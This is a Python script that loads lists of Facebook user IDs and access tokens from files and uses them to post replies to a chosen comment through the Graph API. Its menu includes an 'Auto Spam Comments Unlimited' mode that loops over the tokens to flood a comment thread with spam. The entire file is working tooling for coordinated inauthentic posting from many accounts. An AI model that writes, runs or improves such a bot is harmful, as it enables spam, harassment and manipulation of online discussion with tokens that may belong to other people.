import requests
import time
import re

def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

# Extract the comment ID from the given Facebook post URL
def extract_comment_id_from_url(url):
    match = re.search(r'comment_id=(\d+)', url)
    if match:
        return match.group(1)
    else:
        return None

def reply_to_comment_on_facebook(same_replies, num_replies):
    user_ids = get_ids_tokens('/sdcard/Test/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/Test/toka.txt')
    
    # Accept either a direct comment ID or a full URL
    input_url = input('Enter the comment ID or full URL to reply to: ')
    comment_id = extract_comment_id_from_url(input_url) if 'comment_id=' in input_url else input_url

    if not comment_id:
        print("Invalid URL or Comment ID.")
        return

    if same_replies:
        reply_text = input('Enter the reply text (for all replies): ')
    else:
        reply_texts = [input(f'Enter reply text {i + 1}: ') for i in range(num_replies)]

    replies_count = 0
    reply_index = 0  # To track the current reply text in order

    for i in range(len(user_ids)):
        if replies_count >= num_replies:
            print(f"Successfully made {num_replies} replies.")
            return
        
        user_id = user_ids[i]
        access_token = access_tokens[i]

        try:
            if same_replies:
                text_to_use = reply_text
            else:
                text_to_use = reply_texts[reply_index % len(reply_texts)]  # Ensure replies stay in order
                reply_index += 1  # Increment the index to move to the next reply

            url = f'https://graph.facebook.com/v19.0/{comment_id}/comments'
            params = {'access_token': access_token, 'message': text_to_use}
            response = requests.post(url, params=params)

            if response.status_code == 200:
                replies_count += 1
                print(f"Successfully replied to comment {comment_id} with reply: {text_to_use}")
            else:
                print(f"Failed to reply to comment {comment_id} with reply: {text_to_use}")

            time.sleep(1)  # Reduced delay to 1 second

        except requests.exceptions.RequestException as error:
            print(f"Failed to reply to comment {comment_id} with reply: {text_to_use}")

    if replies_count < num_replies:
        print(f"Only {replies_count} replies were made.")

def auto_spam_comments(same_replies):
    user_ids = get_ids_tokens('/sdcard/Test/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/Test/toka.txt')
    
    # Accept either a direct comment ID or a full URL
    input_url = input('Enter the comment ID or full URL to spam: ')
    comment_id = extract_comment_id_from_url(input_url) if 'comment_id=' in input_url else input_url

    if not comment_id:
        print("Invalid URL or Comment ID.")
        return

    num_replies = int(input('Enter the number of replies to send: '))  # Set number of replies

    if same_replies:
        reply_text = input('Enter the spam comment text (for all replies): ')
    else:
        reply_texts = [input(f'Enter reply text {i + 1}: ') for i in range(num_replies)]

    spam_count = 0
    reply_index = 0  # Track the current reply in case of different replies

    while spam_count < num_replies:
        for i in range(len(user_ids)):
            user_id = user_ids[i]
            access_token = access_tokens[i]

            try:
                if same_replies:
                    text_to_use = reply_text
                else:
                    text_to_use = reply_texts[reply_index % len(reply_texts)]  # Cycle through different replies in order
                    reply_index += 1  # Move to the next reply text

                url = f'https://graph.facebook.com/v19.0/{comment_id}/comments'
                params = {'access_token': access_token, 'message': text_to_use}
                response = requests.post(url, params=params)

                if response.status_code == 200:
                    spam_count += 1
                    print(f"Spam comment #{spam_count} successfully posted: {text_to_use}")
                else:
                    print(f"Failed to spam comment {comment_id} with reply: {text_to_use}")

                time.sleep(1)  # Reduced delay to 1 second

                if spam_count >= num_replies:
                    break

            except requests.exceptions.RequestException as error:
                print(f"Failed to spam comment {comment_id} with reply: {text_to_use}")

    print(f"Stopped after {spam_count} spam comments.")

def main_menu():
    while True:
        print("\nMain Menu")
        print("1. Reply to a comment on Facebook")
        print("2. Auto Spam Comments Unlimited")
        print("3. Exit")
        
        choice = input("Enter your choice: ")
        
        if choice == '1':
            print("Choose reply type:")
            print("1. Same Replies")
            print("2. Different Replies")
            reply_type = input("Enter your choice: ")

            if reply_type == '1':
                num_replies = int(input('Enter the number of replies to make: '))
                reply_to_comment_on_facebook(same_replies=True, num_replies=num_replies)
            elif reply_type == '2':
                num_replies = int(input('Enter the number of replies to make: '))
                reply_to_comment_on_facebook(same_replies=False, num_replies=num_replies)
            else:
                print("Invalid choice. Please try again.")
        elif choice == '2':
            print("Choose spam type:")
            print("1. Same Replies")
            print("2. Different Replies")
            spam_type = input("Enter your choice: ")

            if spam_type == '1':
                auto_spam_comments(same_replies=True)
            elif spam_type == '2':
                auto_spam_comments(same_replies=False)
            else:
                print("Invalid choice. Please try again.")
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()
